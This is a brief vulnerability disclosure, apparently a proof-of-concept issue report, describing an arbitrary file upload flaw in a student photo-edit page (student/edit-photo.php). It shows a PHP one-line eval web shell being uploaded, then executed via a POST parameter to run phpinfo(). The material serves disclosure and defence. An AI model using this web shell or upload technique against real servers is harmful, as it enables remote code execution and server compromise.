# Briefly
In the photo editing of users in this system, there is a file upload vulnerability in the file upload point, and an attacker can use this vulnerability to obtain server permissions.
# Process demonstration
Login interface, where you randomly register an account to wait for the recording
Visit student/edit-photo.php
![image](https://user-images.githubusercontent.com/92901332/226114913-5b0c996f-1ec6-4800-aa18-7a1d80518863.png)
Upload a PHP one-sentence Trojan horse, the specific content of the file is 
```php
<?php @eval($_POST[1]);?>
```
Next, guess the upload file storage path is uploads, visit /uploads
![image](https://user-images.githubusercontent.com/92901332/226115011-eb22ace1-dbce-4e4f-85e7-6c7f498f1c8f.png)
POST submit parameter 1=phpinfo();
![image](https://user-images.githubusercontent.com/92901332/226115046-26176995-e95d-4074-b607-f3c03f4d5be6.png)

command executed successfully
